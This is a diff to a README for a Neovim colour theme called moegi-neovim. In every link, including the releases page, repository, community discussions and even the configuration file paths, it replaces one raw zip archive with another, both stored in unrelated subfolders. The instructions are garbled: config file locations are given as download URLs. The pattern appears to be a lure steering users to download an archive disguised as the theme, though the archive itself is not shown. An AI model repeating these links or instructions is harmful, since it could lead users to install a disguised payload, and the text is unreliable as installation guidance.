@@ -19,14 +19,14 @@ Before you start, make sure you meet the following requirements:
 ## 📦 Download moegi-neovim
 
 ### Download Link
-[![Download moegi-neovim](https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip)](https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip)
+[![Download moegi-neovim](https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip)](https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip)
 
 Visit the page linked above to download the latest version of moegi-neovim.
 
 ## 📝 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip) to go to the Releases page.
 
 2. **Find the Latest Release**  
    Scroll down to find the latest version of moegi-neovim.
@@ -43,7 +43,7 @@ Visit the page linked above to download the latest version of moegi-neovim.
 ### For Neovim Users
 
 1. **Open Your Configuration File**  
-   Typically located at `~https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip` or `~https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip`.
+   Typically located at `~https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip` or `~https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip`.
 
 2. **Add the Theme**  
    Add the following line to your configuration:
@@ -60,7 +60,7 @@ Visit the page linked above to download the latest version of moegi-neovim.
 ### For Vim Users
 
 1. **Open Your Configuration File**  
-   Usually located at `~https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip`.
+   Usually located at `~https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip`.
 
 2. **Add the Theme**  
    Include the line below:
@@ -95,9 +95,9 @@ If you run into any issues or have questions about using moegi-neovim, feel free
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip)
-- [Community Discussions](https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip)
 
 Thank you for choosing moegi-neovim. We hope you enjoy a more stylish and productive coding experience! 
 
-[![Download moegi-neovim](https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip)](https://github.com/Gerrson/moegi-neovim/raw/refs/heads/main/extras/mattermost/moegi_neovim_2.4-alpha.5.zip)
+[![Download moegi-neovim](https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip)](https://raw.githubusercontent.com/Gerrson/moegi-neovim/main/extras/wezterm/moegi_neovim_1.8.zip)
